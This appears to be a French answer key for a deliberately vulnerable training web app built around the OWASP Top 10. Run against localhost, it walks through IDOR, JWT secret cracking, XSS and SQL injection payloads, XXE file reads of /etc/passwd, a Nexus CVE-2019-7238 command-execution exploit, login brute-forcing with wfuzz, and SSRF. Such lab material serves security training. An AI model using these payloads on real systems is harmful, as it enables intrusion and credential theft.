# All solutions

## A01 - Contrôles d'accès défaillants

La page est vulnérable à une Insecure Direct Object Reference (IDOR) car l'ID utilisateur est directement accessible via l'URL sans vérification d'autorisation, l'ID d'utilisateur est le hash MD5 du nom d'utilisateur. Nous pouvons observer dans le code source ce commentaire :

```html
<!--  Si c'est l'administrateur admin_78 alors affiche le panneau de commande -->
```

Nous pouvons donc avoir accès au profil de l'administrateur en modifiant l'ID utilisateur dans l'URL.
Nous obtenons le MD5 de admin_78 : 20541eeb668da7d30c80c56f00726f07

Nous avons donc http://localhost:8042/profile.php?id=20541eeb668da7d30c80c56f00726f07

Nous obtenons le flag.

## A02 - Défaillances cryptographiques

Nous pouvons casser les différents hashs pour obtenir les mots de passe. Soit avec hashcat ou via des sites web comme crackstation.net.

Nous avons le JWT avec un secret faible que nous pouvons trouver :

```bash
git clone https://github.com/wallarm/jwt-secrets.git
hashcat -m 16500 -a 0 jwt_token.txt /jwt-secrets/jwt.secrets.list
```

Nous pouvons obtenir des informations dans le JWT aussi :

```json
{
  "sub": "VulnApp{jW7-iS-sEcUR3}",
  "name": "John Diffol",
  "iat": 1516239022,
  "artefact": "Incal",
  "email": "secret-fbi@yahoo.me",
  "password": "2365047407a61753e467c979bdf219efb9dd3c9c"
}
```

## A03 - Injection

Nous avons une page avec une injection SQL et une XSS. Pour la XSS, nous pouvons tester avec `<script>alert(1)</script>` dans le champ de recherche et cela fonctionne. Nous aurions pu aussi utiliser `"><svg/onload=alert(1)>` ou alors une polyglotte : 
```bash
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
Source : https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

Pour l'injection SQL nous pouvons tester avec SQLmap assez naturellement :
```bash
sqlmap -u "http://localhost:8042/A03.php?username=admin"
sqlmap -u "http://localhost:8042/A03.php?username=admin" --dump
```

Nous pouvons aussi tester avec des injections manuelles :
```sql
http://localhost:8042/A03.php?username=admi%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71786b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x6176666d7877%2Cid%2Cmd5_password%2Cusername%29%29%2C0x717a767171%29%2CNULL%20FROM%20vulnerable_app.users--%20-
```

Nous obtenons le flag.

## A04 - Conception non sécurisée

Nous avons une page de récupération de mot de passe qui n'est pas sécurisée dans sa conception. En effet nous pouvons voir les messages d'erreurs sont trop explicites et donnent des informations sur les utilisateurs. Nous pouvons voir que le message d'erreur nous indique si l'utilisateur existe ou non. Une fois un utilisateur trouvé, en l'occurence `administrateur` nous pouvons récupérer le mot de passe via une question de "sécurité". Nous pouvons choisir la plus simple à trouver. Nous n'avons aucune limite de test donc nous pouvons essayer toutes les villes possibles pour récupérer ensuite le flag. Ici la ville est `Paris` et nous obtenons le flag.

## A05 - Mauvaise configuration de sécurité

Nous avons une page qui parse le XML et qui affiche le contenu. Nous pouvons donc tester une attaque XXE. Nous pouvons tester avec le payload suivant :
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
Nous pouvons voir que cela fonctionne.
Nous essayons donc ensuite :
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
 </userInfo>
```
Et nous obtenons le fichier `/etc/passwd`.

Nous pouvons donc obtenir le flag :
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/flag_xxe.txt"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
 </userInfo>
```

## A06 - Composants vulnérables et obsolètes

Le serveur Nexus utilisé est vulnérable à la CVE 2019-7238. Nous pouvons donc l'exploiter avec le script suivant :

```bash
python3 CVE-2019-7238.py http://localhost:8081/ whoami
python3 CVE-2019-7238.py http://localhost:8081/ "cat /etc/passwd"
python3 CVE-2019-7238.py http://localhost:8081/ "cat /etc/flag.txt"
```

Nous obtenons le flag.

## A07 - Identification et authentification de mauvaise qualité

Nous pouvons voir que nous avons SAP Connexion, c'est donc une connexion pour un serveur SAP. Nous avons une liste des utilisateurs par défaut ici : https://github.com/danielmiessler/SecLists/blob/master/Usernames/sap-default-usernames.txt
Nous pouvons donc lancer des attaques par force brute sur ces utilisateurs. Nous pouvons utiliser hydra ou des outils de fuzzing pour cela :
```bash
wfuzz -z file,/usr/share/wordlists/seclists/Usernames/sap-default-usernames.txt -d "username=FUZZ&password=test" http://localhost:8042/login.php
```
Nous pouvons voir que nous avons trouvé un utilisateur via ce fuzzing. Nous pouvons donc lancer une attaque par force brute sur les mots de passe.

Pour les mots de passe nous pouvons utiliser tout d'abord le fichier 10-million-password-list-top-100.txt dans SecLists. Nous pouvons aussi utiliser rockyou.txt.

Nous avons :
```bash
wfuzz -z file,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -d "username=<USER>&password=FUZZ" http://localhost:8042/login.php
```

Nous obtenons le flag en trouvant le bon utilisateur et le bon mot de passe, ici il faut regarder le nombre de caractères que la page nous renvoie pour savoir si le mot de passe est bon ou non.

## A08 - Manque d'intégrité des données et du logiciel

Repondez à la question pour obtenir le flag.

## A09 - Carence des systèmes de contrôle et de journalisation

Repondez à la question pour obtenir le flag.

## A10 - SSRF (Falsification de requête côté serveur)

Nous pouvons récuperer des pages Web depuis la page A10.php, nous pouvons voir que nous voulons accèder à un flag flag_ssrf.txt mais nous n'avons pas la permission. Nous pouvons donc essayer de récupérer le fichier flag_ssrf.txt via une SSRF. Nous allons donc récupérer le fichier comme ceci :
    
    ```bash
    http://127.0.0.1/flag_ssrf.txt
    http://localhost/flag_ssrf.txt
    ```

Nous obtenons le flag.